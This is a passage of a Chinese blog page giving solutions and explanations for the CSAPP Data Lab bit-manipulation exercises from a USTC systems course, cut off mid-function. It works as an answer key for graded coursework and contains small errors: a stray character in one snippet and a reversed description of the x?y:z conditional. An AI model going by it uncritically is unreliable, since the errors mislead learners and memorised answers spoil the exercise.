<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-pig.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-pig.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-pig.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"ymzlt.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="本文记录中科大研究生课程——计算机系统的相关实验，使用的教材为《深入理解计算机系统》第3版。课程给的实验材料貌似用的是第2版的，额外添加了一些实验要求和说明，但是原理和思想基本都是一样的。">
<meta property="og:type" content="article">
<meta property="og:title" content="中科大计算机系统实验1&amp;2&amp;3">
<meta property="og:url" content="https://ymzlt.github.io/post/ba783922.html">
<meta property="og:site_name" content="YMZ&#39;s Blog">
<meta property="og:description" content="本文记录中科大研究生课程——计算机系统的相关实验，使用的教材为《深入理解计算机系统》第3版。课程给的实验材料貌似用的是第2版的，额外添加了一些实验要求和说明，但是原理和思想基本都是一样的。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ymzlt.github.io/post/ba783922/c2f4430bd910acad95a9e1ea734ec185.svg">
<meta property="og:image" content="https://ymzlt.github.io/post/ba783922/image-20221030174706082.png">
<meta property="og:image" content="https://ymzlt.github.io/post/ba783922/image-20221014201052512.png">
<meta property="og:image" content="https://ymzlt.github.io/post/ba783922/image-20221014200543586.png">
<meta property="og:image" content="https://ymzlt.github.io/post/ba783922/image-20221029143516251.png">
<meta property="og:image" content="https://ymzlt.github.io/post/ba783922/image-20221029171139653.png">
<meta property="og:image" content="https://ymzlt.github.io/post/ba783922/image-20221029190954349.png">
<meta property="og:image" content="https://ymzlt.github.io/post/ba783922/image-20221029201251844.png">
<meta property="og:image" content="https://ymzlt.github.io/post/ba783922/image-20221029202121258.png">
<meta property="og:image" content="https://ymzlt.github.io/post/ba783922/image-20221029210254503.png">
<meta property="article:published_time" content="2022-10-30T09:31:24.000Z">
<meta property="article:modified_time" content="2022-10-30T12:11:34.941Z">
<meta property="article:author" content="YMZ">
<meta property="article:tag" content="实验">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ymzlt.github.io/post/ba783922/c2f4430bd910acad95a9e1ea734ec185.svg">

<link rel="canonical" href="https://ymzlt.github.io/post/ba783922.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>中科大计算机系统实验1&2&3 | YMZ's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">YMZ's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://ymzlt.github.io/post/ba783922.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="YMZ">
      <meta itemprop="description" content="When is the best time to plant a tree? Ten years ago. And when is the next best time? Today.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="YMZ's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          中科大计算机系统实验1&2&3
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-10-30 17:31:24" itemprop="dateCreated datePublished" datetime="2022-10-30T17:31:24+08:00">2022-10-30</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/csapp/" itemprop="url" rel="index"><span itemprop="name">csapp</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/post/ba783922.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/post/ba783922.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>25k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>31 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>本文记录中科大研究生课程——计算机系统的相关实验，使用的教材为《深入理解计算机系统》第3版。课程给的实验材料貌似用的是第2版的，额外添加了一些实验要求和说明，但是原理和思想基本都是一样的。</p>
<span id="more"></span>
<h1 id="实验1位操作data-lab">实验1：位操作（Data Lab）</h1>
<h2 id="实验介绍">实验介绍</h2>
<p>本实验考察计算机信息的表示，要求实现简单的位操作、逻辑运算、二进制补码和浮点函数，并且限制了可使用的
C 操作符和数量，有助于理解 C
数据类型的位级表示以及数据操作的位级行为。本实验总共包括位操作的15个编程题。</p>
<h2 id="实验环境">实验环境</h2>
<table>
<thead>
<tr class="header">
<th>CPU</th>
<th>Intel(R) Xeon(R) Silver 4110 CPU @ 2.10GHz</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>操作系统</td>
<td>Ubuntu 20.04.3 (64位)</td>
</tr>
<tr class="even">
<td>C/C++编译器</td>
<td>gcc version 9.4.0</td>
</tr>
</tbody>
</table>
<h2 id="实验要求">实验要求</h2>
<p>"bits.c"文件中包含需要实现的15个函数，文件中规定了实现每个函数需要的逻辑和算术操作符（规定数量）。</p>
<ul>
<li>只能使用规定的操作符
<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></li>
<li>不能使用循环或者条件语句</li>
<li>不能使用超过8位的常数 <code>0xff</code></li>
</ul>
<h2 id="实验思路">实验思路</h2>
<h3 id="bitxor">1. bitXor</h3>
<p>本题要求使用按位与<code>&amp;</code>和按位取反<code>~</code>实现按位异或。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp;</span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123; </span><br><span class="line">  <span class="keyword">return</span> ~(~x &amp; ~y) &amp; ~(x &amp; y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>异或就是当参与运算的两个二进制数不同时结果才为1，其他情况为0。</p>
<p>根据德摩根定律（参考离散数学集合论知识）：</p>
<p><img src="/post/ba783922/c2f4430bd910acad95a9e1ea734ec185.svg"></p>
<p>推导出：</p>
<p><img src="/post/ba783922/image-20221030174706082.png" alt="image-20221030174706082" style="zoom: 50%;"></p>
<p>转换为C代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x^y=~(~x&amp;~y)&amp;~(x&amp;y)</span><br></pre></td></tr></table></figure>
<h3 id="tmin">2. tmin</h3>
<p>求int类型的最小值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>C 语言中 <code>int</code> 类型是32位，即4字节数 。<code>int</code>
类型的最小值，即最高位符号位为 1，其他位均为 0，所以只需要将 1 左移 31
位。</p>
<h3 id="istmax">3. isTmax</h3>
<p>判断输入值是否为 int 类型的最大值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> !((~(x+<span class="number">1</span>)^x))&amp;!!(x+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考虑四位的最大值<code>x=0111</code>
，x+1之后就会变成<code>1000</code> ，对<code>1000</code> 取非
<code>0111</code>
就会重新变回x值，自己与自己异或会得到0，所以可以用异或来判断<code>~(x+1)</code>与<code>x</code>是否相等，从而判断是否为x最大值。</p>
<blockquote>
<p>小技巧：等号的操作可以直接利用<code>a == b</code> 等价于
<code>!(a ^b)</code></p>
</blockquote>
<p>这里有一个例外就是<code>x=-1</code> ，由于<code>-1=1111</code>
他利用上面的式子判断也符合，故要特判-1 利用<code>!!(x+1)</code>
这个操作-1和最大值并不相同。</p>
<h3 id="alloddbits">4. allOddBits</h3>
<p>判断所有奇数位是否都为1，这里的奇数指的是位的阶级是2的几次幂。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> mask = <span class="number">0xAA</span> + (<span class="number">0xAA</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  mask = mask + (mask &lt;&lt; <span class="number">16</span>); <span class="comment">// 迭代两次得到奇数位全1的掩码</span></span><br><span class="line">  <span class="keyword">return</span> !((mask &amp; x) ^ mask); <span class="comment">// 即判断 mask&amp;x == mask</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先要构造掩码，使用移位运算符构造出奇数位全1的数 <code>mask</code>
，然后获取输入 <code>x</code>
值的奇数位，其他位清零（<code>mask&amp;x</code>），然后与
<code>mask</code>
进行异或操作，若相同则最终结果为0，然后返回其值的逻辑非。</p>
<h3 id="negate">5. negate</h3>
<p>不使用 <code>-</code> 操作符，求 <code>-x</code> 值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * negate - return -x</span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 补码等于反码加1</span></span><br><span class="line">  <span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>补码实际上是一个阿贝尔群，满足性质公式：<code>A + ~A = -1</code>和<code>A + neg A =0</code>，利用这两个式子我们可以得到
<code>neg A = ~A + 1</code>，对于 <code>x</code>，<code>-x</code>
是其补码，所以 <code>-x</code> 可以通过对 <code>x</code>
取反加1得到。</p>
<h3 id="isasciidigit">6. isAsciiDigit</h3>
<p>计算输入值是否是数字 0-9 的 <code>ASCII</code> 值，即计算
<code>x</code> 是否在 0x30 ~ 0x39 范围内。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> !((x &amp; <span class="number">0xf0</span>) ^ <span class="number">0x30</span>) &amp; !(((x &amp; <span class="number">0x0f</span>) + <span class="number">6</span>) &gt;&gt; <span class="number">4</span>) &amp; !(x &amp; (~<span class="number">0xff</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分别对低位和高位字节进行判断：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断 低位第2字节 是否等于0x30 是则返回0</span></span><br><span class="line"><span class="type">int</span> res2 = (x &amp; <span class="number">0xf0</span>)^<span class="number">0x30</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断 低位第1字节 在+6以后是否不进位 不进位说明在0~9之间 是则返回0</span></span><br><span class="line"><span class="type">int</span> res1 = ((x &amp; <span class="number">0x0f</span>) + <span class="number">6</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断其他高位字节 是否等于0 是则返回0</span></span><br><span class="line"><span class="type">int</span> res3 = x &amp; (~<span class="number">0xff</span>);s</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后综合在一起</span></span><br><span class="line"><span class="keyword">return</span> !res1 &amp; !res2 &amp; !res3;</span><br></pre></td></tr></table></figure>
<h3 id="conditional">7. conditional</h3>
<p>实现类似<code>x?y:z</code>的条件计算。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z</span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> mask = (!x)<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> (y | ~mask) &amp; (z | mask) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>x?y:z</code>表示当x为0时返回y，当x不为0时返回z；</p>
<p>（1）先使用<code>！</code>对<code>x</code>进行判断，得到布尔值0或1，再减1可分别得到<code>0xffffffff</code>和<code>0x0</code></p>
<p>（2）构造<code>y | ~mask</code>，此时当mask=<code>0xffffffff</code>时取y，当mask=<code>0x0</code>时取<code>0xffffffff</code>;对称构造<code>z | mask</code>,此时当mask=<code>0xffffffff</code>时取<code>0xffffffff</code>，当mask=<code>0x0</code>时取z;用<code>&amp;</code>连接即可满足条件。</p>
<h3 id="islessorequal">8. isLessOrEqual</h3>
<p>实现小于等于比较。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0</span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 获取x和y的符号值 默认是算术右移 负数----1111 正数-----0000</span></span><br><span class="line">  <span class="type">int</span> sx = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> sy = y &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="comment">// 判断符号是否相同  相同----0000 不同-----1111</span></span><br><span class="line">  <span class="type">int</span> mask = sx ^ sy;</span><br><span class="line">  <span class="comment">// 在符号相同时 判断y-x值的符号 y&lt;x---0000---0 y&gt;=x---1111---1</span></span><br><span class="line">  <span class="type">int</span> sm = (y + (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="comment">// 符号不同时 判断sx sx=1111---x&lt;y---1  sx=0000----x&gt;y---0</span></span><br><span class="line">  <span class="keyword">return</span> !!((mask &amp; sx) | (~mask &amp; ~sm));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="logicalneg">9. logicalNeg</h3>
<p>实现逻辑非运算。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of</span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> ~((x | (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>0与其他整数的区别是，0的负数仍然为0，而其他整数求负数后符号改变。这里要考虑一个特例，当x为最小值<code>0x80000000</code>时，x的负数仍然为最小值，最高位虽然不变但是仍为1。综上，除0以外，x和其负数的最高位中必有一个是1。</p>
<p>int类型中负数用补码表示，求补码即反码加一，构造<code>(x | (~x + 1))</code>操作，只有<code>x=0</code>时最高位保持
0，利用这一点，求反后右移保留最高位，检测该位是否为 1
就可以实现逻辑非。</p>
<h3 id="howmanybits">10. howManyBits</h3>
<p>计算最少需要多少位可以用补码表示法来表示数<code>x</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sign = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> b16, b8, b4, b2, b1, b0;</span><br><span class="line">  x = (sign &amp; ~x) | (~sign &amp; x);</span><br><span class="line">  b16 = !!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">  x = x &gt;&gt; b16;</span><br><span class="line">  b8 = !!(x &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  x = x &gt;&gt; b8;</span><br><span class="line">  b4 = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  x = x &gt;&gt; b4;</span><br><span class="line">  b2 = 